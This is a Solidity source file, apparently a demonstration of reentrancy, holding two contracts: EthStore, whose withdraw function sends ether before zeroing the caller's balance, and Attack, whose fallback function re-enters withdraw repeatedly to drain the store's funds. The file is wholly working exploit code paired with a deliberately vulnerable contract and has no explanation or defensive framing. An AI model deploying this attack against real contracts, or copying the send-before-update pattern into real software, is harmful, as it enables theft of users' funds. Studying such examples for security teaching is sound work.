// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

contract EthStore {
    mapping(address => uint) public balances;

    function deposite() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint bal = balances[msg.sender];
        require(bal > 0, "Insufficient balance");

        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send eth");

        balances[msg.sender] = 0;
    }

    // get contract balance
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract Attack {
    EthStore public ethStore;

    constructor(address _ethStoreAddress) {
        ethStore = EthStore(_ethStoreAddress);
    }

    fallback() external payable {
        if (address(ethStore).balance >= 1 ether) {
            ethStore.withdraw();
        }
    }

    function attack() public payable {
        require(msg.value >= 1 ether, "Insufficient amout");
        ethStore.deposite{value: 1 ether}();
        ethStore.withdraw();
    }

    // get contract balance
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}